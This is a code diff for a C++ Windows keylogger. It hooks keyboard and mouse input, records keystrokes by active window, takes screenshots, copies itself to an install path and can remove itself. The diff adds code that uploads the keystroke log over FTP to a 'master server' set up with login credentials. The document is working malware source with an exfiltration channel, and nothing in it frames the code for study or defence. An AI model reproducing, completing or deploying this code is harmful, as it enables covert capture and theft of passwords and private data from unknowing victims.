@@ -64,7 +64,10 @@ void KeyLogger::removeSelf() {
 }
 
 void KeyLogger::freeResources() {
- 
+    
+    if (useFTP) {
+        ftpClient.disconnect();
+    }
     logFile.close();
     UnhookWindowsHookEx(khook);
     UnhookWindowsHookEx(mhook);
@@ -95,6 +98,8 @@ KeyLogger::KeyLogger() {
     CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
     
     activeWindowTitle = getActiveWindowTitle();
+
+    useFTP = false;
 }
 
 KeyLogger::~KeyLogger() {
@@ -242,7 +247,7 @@ std::string KeyLogger::screenshot() {
 }
 
 void KeyLogger::loop() {
-    
+
     MSG message;
     while (GetMessage(&message, NULL, 0, 0)) {
         TranslateMessage(&message);
@@ -261,11 +266,11 @@ void KeyLogger::listen() {
     mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
 
     logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
-    
+
 }
 
 void KeyLogger::log(std::string text) {
-    
+
     //user switched windows
     if (getActiveWindowTitle() != activeWindowTitle) {
         writeBuffer();//dump last window's information to file
@@ -275,12 +280,12 @@ void KeyLogger::log(std::string text) {
 }
 
 void KeyLogger::install(std::string target) {
-     
+    
     //already installed, skip
     if (target == programPath) {
         return;
     }
-    
+
     //install keylogger and exit
     CopyFile(programPath.c_str(), target.c_str(), true);
 
@@ -292,18 +297,29 @@ void KeyLogger::install(std::string target) {
 void KeyLogger::writeBuffer()
 {
     logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
+    
+    #ifdef USE_FTP
+    if (useFTP) {
+        
+        //upload to master server if it's time
+        if (time(NULL) - lastUpload > UPLOAD_DELTA) {
+            lastUpload = time(NULL);
+            upload();
+        }
 
-    if (time(NULL) - lastUpload > UPLOAD_DELTA) {
-        lastUpload = time(NULL);
-        upload();
+        //otherwise just keep the connection open
+        else {
+            ftpClient.keepAlive();
+        }
     }
-
+    #endif
+    
     activeWindowTitle = getActiveWindowTitle();
     keyboardBuffer = "";
 }
 
 std::string KeyLogger::getTimeString() {
-    
+
     time_t currentTime = time(NULL);
     char dateString[100];
     ctime_s(dateString, sizeof(dateString), &currentTime);
@@ -325,6 +341,28 @@ std::string KeyLogger::getUserHomeDirectory() {
     char buffer[1024];
     GetEnvironmentVariable("USERPROFILE", buffer, sizeof(buffer));
     strcat_s(buffer, "\\");
-    
+
     return std::string(buffer);
 }
+
+#ifdef USE_FTP
+void KeyLogger::upload() {
+
+    std::string keystrokesFile;
+    keystrokesFile += DATADIR;
+    keystrokesFile += "\\";
+    keystrokesFile += KEYSTROKES_FILE;
+
+    ftpClient.upload(keystrokesFile, uploadDir, sf::Ftp::Ascii);
+}
+
+void KeyLogger::setMaster(std::string server, int port, std::string login, std::string password, std::string _uploadDir) {
+    
+    ftpClient.connect(server, port);
+
+    if (ftpClient.login(login, password).isOk()) {
+        useFTP = true;
+        uploadDir = _uploadDir;
+    }
+}
+#endif
